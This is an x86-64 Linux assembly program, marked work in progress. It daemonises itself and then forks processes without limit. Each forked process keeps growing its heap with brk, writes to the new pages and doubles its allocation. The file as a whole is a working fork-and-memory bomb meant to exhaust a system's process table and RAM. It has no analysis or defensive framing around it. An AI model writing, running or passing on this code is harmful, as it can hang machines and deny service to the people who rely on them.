;WORK IN PROGRESS
section .data

s dq 0
ns dq 10000000 ;10ms


section .text

global _start
_start:

    ;fork
    mov rax, 57
    syscall 
    test rax,rax
    jz continue

    locked: ;idle spin lock main proces to prevent terminal detach
    ;nanosleep
    mov rax, 35
    mov rdi, s
    xor rsi, rsi
    syscall
    jmp locked

    continue:
	;SEEDER CODE

    ; DEAMONIZE child to become child of init
    ;fork
    mov rax, 57
    xor rdi, rdi
    syscall 
    test rax,rax 
    jnz exit
    ; DEAMONIZE

    start:
    ; ;nanosleep
    ; mov rax, 35
    ; mov rdi, s
    ; xor rsi, rsi
    ; syscall
    ; jmp start


	;fork
	mov rax, 57
	syscall	
	test rax,rax
	jz go

	;nanosleep
	mov rax, 35
	mov rdi, s
	xor rsi, rsi
	syscall

	jmp start
	go:

    ;GROWER CODE init

    ;brk
    mov rax, 12
    xor rdi, rdi
    syscall

    mov rbx, rax ; get current state
    mov r12, 1024*1024 ;1M

    grow:
    ;GROWER CODE

    ;brk
    mov rax, 12
    lea rdi, [rbx+r12]
    syscall

    ;fork
    mov rax, 57
    syscall
    test rax, rax
    jnz grow

    ;dirty pages
    mov rcx, r12
    shr rcx, 10 ; /1024 ergo how manny kb
    lop:
    mov rax, rcx
    shl rax, 10 ;rax = rcx*1024
    dec rax
    mov byte [rbx+rax], 0
    loop lop
    ;TODO

    ;double page size
    shl r12, 1

    jmp grow

    exit:
    ;exit
    mov rax, 60
    xor rdi, rdi
    syscall